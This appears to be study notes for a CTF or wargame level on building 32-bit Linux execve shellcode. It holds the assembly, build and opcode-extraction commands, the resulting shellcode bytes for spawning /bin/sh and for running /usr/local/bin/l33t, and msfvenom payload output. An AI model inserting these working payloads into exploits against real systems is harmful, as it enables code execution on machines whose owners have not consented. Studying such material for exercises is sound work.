To test 32 bit shellcode on linux x86-64

1) vim execve.nasm
2) nasm execve.nasm -f elf32 -o execv.o <- May not be necassary
3) ld -m elf_i386 -s -o execve execve.o
4) ./execve
5) objdump -d ./execve | grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'

"\x31\xc0\x89\xc2\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xd1\xcd\x80"

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Assembly with notes
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------

global _start 

_start:

        xor eax, eax ;rax 0 here
        mov edx, eax ;start of moving null
        mov al, 11 ;execve syscall number
        push edx ;push 0 onto stack

        ;next step is to place /bin/sh into rbx register and should be followed by null terminator
        ;do this by pushing str onto stack in reverser order and move rsp into rbx register
        ;mov rbx, /bin/sh

        push 0x68732f2f
        push 0x6e69622f ;this = hs//nib/. has 2 slashes b/c /=// and need to fill out 8 bytes

        mov ebx, esp ;rsp contain bin...+0
        mov ecx, edx

        int 0x80

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Assembly without notes
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------

global _start 

_start:

        xor eax, eax 
        mov edx, eax 
        mov al, 11 
        push edx 
        push 0x68732f2f
        push 0x6e69622f
        mov ebx, esp
        mov ecx, edx
        int 0x80

----------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Level 8 Assembly
----------------------------------------------------------------------------------------------------------------------------------------------------------------------------

global _start 

_start:

        xor eax, eax
        mov edx, eax 
        mov al, 11 
        push edx 

        push 0x7433336c
        push 0x2f6e6962
        push 0x2f6c6163
        push 0x6f6c2f2f
        push 0x7273752f

        mov ebx, esp 
        mov ecx, edx

        int 0x80








 ./msfvenom -f c -p linux/x86/exec CMD=/usr/local/bin/l33t --platform linux
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 55 bytes
Final size of c file: 256 bytes
unsigned char buf[] = 
"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68"
"\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x14\x00\x00\x00\x2f"
"\x75\x73\x72\x2f\x6c\x6f\x63\x61\x6c\x2f\x62\x69\x6e\x2f\x6c"
"\x33\x33\x74\x00\x57\x53\x89\xe1\xcd\x80";
